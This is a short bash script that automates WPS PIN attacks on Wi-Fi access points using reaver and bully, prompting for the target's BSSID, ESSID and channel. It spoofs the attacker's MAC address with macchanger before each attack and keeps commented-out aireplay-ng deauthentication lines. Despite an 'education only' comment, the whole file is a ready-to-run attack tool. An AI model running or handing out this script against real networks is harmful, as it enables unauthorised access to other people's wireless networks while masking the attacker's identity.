#!/bin/bash
# Reaver + Bully WPS Exploiting BRUTE bash script
# Education useage only!
# This has caused a failure in the Randomized WPS system
# Further testing required
# Written by Diveyez to make using other tools easy when setting up wireless networks.
# Intended for use with stock kali-linux packages
# apt update && apt install reaver bully airmon-ng aireplay-ng macchanger pixiewps
# Scripting user input for target, channel, interface
echo "You need an adapter in monitor mode to use this, airmon-ng start <interface> if you have not done that already!"
sleep 1.5
echo "What interface do we use?:"
read interface
echo "Using:" $interface;
echo "What channel is target on?:"
read channel
echo "Using Channel:" $channel;
echo "Whats the target BSSID(MacAddress)?:"
read tmac
echo "Target is:" $tmac
echo "Whats the target ESSID(BroadcastName)?:"
read bname
echo "Target ESSID is:" $bname
# Menu Time
PS3='Choose Attack Type (1: Reaver 2: Bully) or use 3 to quit: '
options=("Reaver" "Bully" "Quit")
select opt in "${options[@]}"
do
    case $opt in
        "Reaver")
            echo "Reaver Attack Launching"
          ifconfig $interface down
          macchanger -r $interface
          ifconfig $interface up
          #aireplay-ng -0 300 -a $tmac -c $interface >> /dev/null 2>&1
          reaver -i $interface -b $tmac -c $channel -vv -K -JSL -p "";;
        "Bully")
            echo "Bully Attack Launching"
         ifconfig $interface down
         macchanger -r $interface
         ifconfig $interface up
         #aireplay-ng -0 300 -a $tmac -c $interface >> /dev/null 2>&1
         bully $interface -b $tmac -e $bname -c$channel -dB -v 3 -p "" ;;
        "Quit")
            break
            ;;
        *) echo invalid option;;
    esac
#1337
echo "If that didnt work, Well, We tried!"
echo "If this failed, you may have used incorrect information, or the AP is not vulernable (WPS)"
done
